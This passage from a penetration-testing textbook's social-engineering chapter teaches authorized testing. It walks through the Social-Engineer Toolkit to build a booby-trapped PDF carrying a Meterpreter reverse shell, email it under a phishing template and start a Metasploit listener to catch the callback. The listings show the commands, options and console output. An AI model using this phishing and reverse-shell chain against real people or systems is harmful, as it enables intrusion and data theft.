11
soCial engineering
It is a common saying in information security that
users are the vulnerability that can never be patched.
Put all the security controls in place that you want,
but if an employee can be convinced to give up sensi-
tive company information, it is all for naught. In fact,
many of the most famous hacks include no system
exploitation at all.
For example, consider notorious hacker Kevin Mitnick. Many of Mitnick’s
most famous exploits came down to walking into a building, convincing
the security guard he had permission to be there, and then walking out
with what he wanted. This kind of attack, called social engineering, exploits
human vulnerabilities: a desire to be helpful, unawareness of security poli-
cies, and so on.
Social-engineering attacks can involve complex technical requirements
or no technology at all. A social engineer can buy a cable guy uniform at
the thrift store and potentially walk into an organization, and even into the
server room. The IT help desk can receive a frantic call from the boss’s
boss’s assistant, who claims to have locked himself out of his webmail
account. People generally want to be helpful, so unless there is a secure
policy in place, the help desk worker may read back the password over the
phone or set it to a default value, even though the caller is not who he says
he is.
A common vector for social-engineering attacks is email. If you are ever
short on entertainment at work, check out your email spam folder. Among
the advertisements to make some things bigger and others smaller, you will
find people trying desperately to give you all their money. I firmly believe
that if you can find the one African prince who really does want to give you
his fortune, it will be worth all those times your bank account got hacked
from answering phishing emails. Joking aside, attempting to trick a user
into giving up sensitive information by posing as a trusted person via email
or other electronic means is known as a phishing attack. Phishing emails can
be used to lure targets to visit malicious sites or download malicious attach-
ments, among other things. Social-engineering attacks are the missing
element needed to trick users into falling victim to the client-side attacks we
studied in Chapter 10.
Companies should put time and effort into training all employees
about social-engineering attacks. No matter what sort of security technolo-
gies you put in place, employees have to be able to use their workstations,
their mobile devices, and so on to get their job done. They will have access
to sensitive information or security controls that, in the wrong hands, could
harm the organization. Some security-awareness training may seem obvi-
ous, like “Don’t share your password with anyone” and “Check someone’s
badge before you hold the door to a secure area for him or her.” Other
security awareness may be new to many employees. For instance, on some
pentesting engagements, I’ve had great success leaving USB sticks in the
parking lot or DVDs labeled “Payroll” on the bathroom floor. Curious users
start plugging these in, opening files, and giving me access to their systems.
Security-awareness training about malicious files, USB switchblades, and
other attacks can help stop users from falling victim to these types of social-
engineering attacks.
the social-engineer toolkit
TrustedSec’s Social-Engineer Toolkit (SET), an open source Python-driven
tool, is designed to help you perform social-engineering attacks during pen-
tests. SET will help you create a variety of attacks such as email phishing
campaigns (designed to steal credentials, financial information, and so on
using specially targeted email) and web-based attacks (such as cloning a
client website and tricking users into entering their login credentials).
244 Chapter 11
SET comes preinstalled in Kali Linux. To start SET in Kali Linux,
enter setoolkit at a prompt, as shown in Listing 11-1. We’ll use SET to run
social-engineering attacks, so enter a 1 at the prompt to move to the Social-
Engineering Attacks menu. You will be prompted to accept the terms of
service.
root@kali:~# setoolkit
--snip--
Select from the menu:
1) Social-Engineering Attacks
2) Fast-Track Penetration Testing
3) Third Party Modules
--snip--
99) Exit the Social-Engineer Toolkit
set> 1
Listing 11-1: Starting SET
In this chapter we’ll look at just a few of the SET attacks that I use regu-
larly on pentesting engagements. We’ll begin with spear-phishing attacks,
which allow us to deliver attacks via email.
spear-Phishing attacks
The Social-Engineering Attacks menu gives us several attack options, as
shown in Listing 11-2. We’ll create a spear-phishing attack, which will allow
us to create malicious files for client-side attacks (like the ones covered in
Chapter 10), email them, and automatically set up a Metasploit handler to
catch the payload.
Select from the menu:
1) Spear-Phishing Attack Vectors u
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
--snip--
99) Return back to the main menu.
set> 1
Listing 11-2: Choose Spear-Phishing Attack Vectors
Select option 1 to choose Spear-Phishing Attack Vectors u. The Spear-
Phishing Attack Vectors menu is shown in Listing 11-3.
1) Perform a Mass Email Attack u
2) Create a FileFormat Payload v
3) Create a Social-Engineering Template w
Social Engineering 245
--snip--
99) Return to Main Menu
set:phishing> 1
Listing 11-3: Choose Perform a Mass Email Attack
The first option, Perform a Mass Email Attack u, allows us to send a mali-
cious file to a predefined email address or list of addresses as well as set up
a Metasploit listener for the selected payload. The second option, Create a
FileFormat Payload v, lets us create a malicious file with a Metasploit payload.
The third option allows us to create a new email template w to be used in
SET attacks.
Choose option 1 to create an email attack. (We’ll have the option to
send a single email or mass email later.)
Choosing a Payload
Now to choose a payload. A selection of payload options is shown in
Listing 11-4.
********** PAYLOADS **********
1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
--snip--
12) Adobe util.printf() Buffer Overflow u
--snip--
20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)
set:payloads> 12
Listing 11-4: Choose a spear-phishing attack
For example, to re-create our PDF attack from Chapter 10, choose
option 12: Adobe util.printf() Buffer Overflow u. (SET includes many
Metasploit attacks, as well as its own, specific attacks.)
You should be prompted to choose a payload for your malicious file
(see Listing 11-5).
1) Windows Reverse TCP Shell Spawn a command shell on victim and
send back to attacker
2) Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim
and send back to attacker u
--snip--
set:payloads> 2
Listing 11-5: Choose a payload
246 Chapter 11
The usual suspects are all here, including windows/meterpreter/reverse_tcp,
which appears in a more human-readable form as Windows Meterpreter Reverse_
TCP u. We’ll choose this option for our sample attack.
Setting Options
SET should prompt for the relevant options for the payload, in this case the
LHOST and LPORT. If you’re not very familiar with Metasploit, just answer the
prompts to set the correct options automatically, as shown in Listing 11-6.
Set the payload listener to the IP address of Kali Linux. Leave the port to
connect back on to the default (443).
set> IP address for the payload listener: 192.168.20.9
set:payloads> Port to connect back on [443]:
[-] Defaulting to port 443...
[-] Generating fileformat exploit...
[*] Payload creation complete.
[*] All payloads get sent to the /usr/share/set/src/program_junk/template.pdf
directory
[-] As an added bonus, use the file-format creator in SET to create your
attachment.
Listing 11-6: Setting options
Naming Your File
Next you should be prompted to name your malicious file.
Right now the attachment will be imported with filename of 'template.whatever'
Do you want to rename the file?
example Enter the new filename: moo.pdf
1. Keep the filename, I don't care.
2. Rename the file, I want to be cool. u
set:phishing> 2
set:phishing> New filename: bulbsecuritysalaries.pdf
[*] Filename changed, moving on...
Select option 2 u to rename the malicious PDF, and enter the filename
bulbsecuritysalaries.pdf. SET should continue.
Single or Mass Email
Now to decide whether to have SET send our malicious file to a single email
address or a list of addresses, as shown in Listing 11-7.
Social Engineering 247
Social Engineer Toolkit Mass E-Mailer
What do you want to do:
1. E-Mail Attack Single Email Address u
2. E-Mail Attack Mass Mailer v
99. Return to main menu.
set:phishing> 1
Listing 11-7: Choosing to perform a single email address attack
Choose the single email address option u for now. (We’ll look at send-
ing mass email v in “Mass Email Attacks” on page 253.)
Creating the Template
When crafting the email, we can use one of SET’s email templates or enter
text for one-time use in the template. In addition, if you choose Create a
Social-Engineering Template, you can create a template that you can reuse.
Many of my social engineering customers like me to use fake emails
that appear to come from a company executive or the IT manager, announc-
ing new website functionality or a new company policy. Let’s use one of
SET’s email templates as an example to fake this email now, as shown in
Listing 11-8; we’ll create our own email later in the chapter.
Do you want to use a predefined template or craft a one time email
template.
1. Pre-Defined Template
2. One-Time Use Email Template
set:phishing> 1
[-] Available templates:
1: Strange internet usage from your computer
2: Computer Issue
3: New Update
4: How long has it been
5: WOAAAA!!!!!!!!!! This is crazy...
6: Have you seen this?
7: Dan Brown's Angels & Demons
8: Order Confirmation
9: Baby Pics
10: Status Report
set:phishing> 5
Listing 11-8: Choosing an email template
Choose 1 for Pre-Defined Template, then choose template 5.
Setting the Target
Now SET should prompt you for your target email address and a mail server
for use in delivering the attack email. You can use your own mail server, one
248 Chapter 11
that is misconfigured to allow anyone to send mail (called an open relay),
or a Gmail account, as shown in Listing 11-9. Let’s use Gmail for this attack
by choosing option 1.
set:phishing> Send email to: PI:EMAIL
1. Use a gmail Account for your email attack.
2. Use your own server or open relay
set:phishing> 1
set:phishing> Your gmail email address: PI:EMAIL
set:phishing> The FROM NAME user will see: Georgia Weidman
Email password:
set:phishing> Flag this message/s as high priority? [yes|no]: no
[!] Unable to deliver email. Printing exceptions message below, this is most
likely due to an illegal attachment. If using GMAIL they inspect PDFs and is
most likely getting caught. u
[*] SET has finished delivering the emails
Listing 11-9: Sending email with SET
When prompted, enter the email address and password for your Gmail
account. SET should attempt to deliver the message. But as you can see in
the message at the bottom of the listing, Gmail inspects attachments and
catches our attack u.
That’s just a first attempt, of course. You may get better results using
your own mail server or your client’s mail server, if you can gather or guess
the credentials.
Of course, in this example, I’m just sending emails to myself. We
looked at tools such as theHarvester to find valid email addresses to target
in Chapter 5.
Setting Up a Listener
We can also have SET set up a Metasploit listener to catch our payload
if anyone opens the email attachment. Even if you’re not familiar with
Metasploit syntax, you should be able to use SET to set up this attack based
on the options we chose in “Setting Options” on page 247. You can see
that SET uses a resource file to automatically set the payload, LHOST, and
LPORT options based on our previous answers when building the payload
(see Listing 11-10).
set:phishing> Setup a listener [yes|no]: yes
Easy phishing: Set up email templates, landing pages and listeners
in Metasploit Pro's wizard -- type 'go_pro' to launch it now.
=[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops
[*] Processing src/program_junk/meta_config for ERB directives.
resource (src/program_junk/meta_config)> use exploit/multi/handler
Social Engineering 249
resource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/
reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (src/program_junk/meta_config)> set LHOST 192.168.20.9
LHOST => 192.168.20.9
resource (src/program_junk/meta_config)> set LPORT 443
LPORT => 443
--snip--
resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse handler on 192.168.20.9:443
[*] Starting the payload handler...
Listing 11-10: Setting up a listener
Now we wait for a curious user to open our malicious PDF and send us
a session. Use ctrl-C to close the listener and type exit to move back to the
previous menu. Option 99 will take you back to SET’s Social-Engineering
Attacks menu.
web attacks
In this section we’ll look at web-based attacks. Return to the Social-
Engineering Attacks menu (Listing 11-2), and choose option 2 (Website
Attack Vectors). This is the sort of attack that I use most often in pentests
that have a social-engineering component because it emulates many social-
engineering attacks seen in the wild.
You should be presented with a list of web-based attacks as shown in
Listing 11-11.
1) Java Applet Attack Method
2) Metasploit Browser Exploit Method